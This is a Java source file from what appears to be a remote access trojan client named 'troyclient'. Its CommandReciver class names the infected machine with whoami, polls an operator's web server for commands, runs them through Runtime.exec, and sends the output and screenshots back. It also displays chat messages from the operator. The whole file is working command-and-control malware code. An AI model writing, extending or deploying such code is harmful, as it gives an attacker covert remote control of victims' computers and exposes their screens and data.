package ch.lebois.troyclient.functions;

import ch.lebois.troyclient.chat.Chat;
import ch.lebois.troyclient.service.GetContext;
import ch.lebois.troyclient.service.Sender;
import ch.lebois.troyclient.service.WebHandler;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;

import static ch.lebois.troyclient.service.GetContext.SENDER;

public class CommandReciver {

    private WebHandler webHandler;

    public CommandReciver() {
        GetContext.CLIENT_NAME = execute("whoami").get(1).replace("\\", "-");
        webHandler = new WebHandler(GetContext.URL + "/command/" + GetContext.CLIENT_NAME);
        SENDER = new Sender();
    }

    public void readCommands() {
        try {
            String left = webHandler.getContent().split("id=\"commands\">\n")[1].split("</pre>")[0];

            String[] commands = left.replace("\\r", "").split("\\n");
            for (String command : commands) {
                try {
                    switch (command.toLowerCase()) {
                        case "screenshot":
                            SENDER.send("screen", "Screenshot taken '" + Screenshot.takeScreenshot() + "'");
                            break;
                        case "cmd":
                        case "bash":
                        case "yes":
                            SENDER.send("error", "Command '" + command + "' not allowed");
                            break;
                        case "clear":
                            for (int i = 27; i != 0; i--) {
                                SENDER.send("commandout", "");
                            }
                            break;
                        default:
                            if (command.contains("msg")) {
                                Chat chat = Chat.getInstance();
                                if (command.contains("clear")) {
                                    chat.clearChat();
                                    SENDER.send("message", "CHAT - Cleared");
                                } else {
                                    chat.addMessage("LeBoi: " + command.substring(6));
                                    execute(command);
                                    SENDER.send("message", "CHAT - LeBoi: " + command.substring(6));
                                }
                            } else {
                                executeFinalCommand(command);
                            }
                            break;
                    }

                } catch (NullPointerException e) {
                    e.printStackTrace();
                }
            }
        } catch (NullPointerException | IndexOutOfBoundsException e) {
//            e.printStackTrace();
        }
    }

    private void executeFinalCommand(String command) {
        try {
            if (!command.equals("")) {
                for (String out : execute(command)) {
                    SENDER.send("commandout", out);
                }
            }
        } catch (NullPointerException e) {
            e.printStackTrace();
            SENDER.send("errorout", "No command '" + command + "' found");
        }
    }


    private ArrayList<String> execute(String command) {

        ArrayList<String> output = new ArrayList<>();
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = command.split(" ");
            Process proc = rt.exec(commands);

            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));

            output.add(System.getProperty("user.dir") + " $ " + command);

            String s;
            while ((s = stdInput.readLine()) != null) {
                output.add(s);
            }

            while ((s = stdError.readLine()) != null) {
                output.add(s);
            }
        } catch (IOException e) {
            return null;
        }
        return output;
    }
}
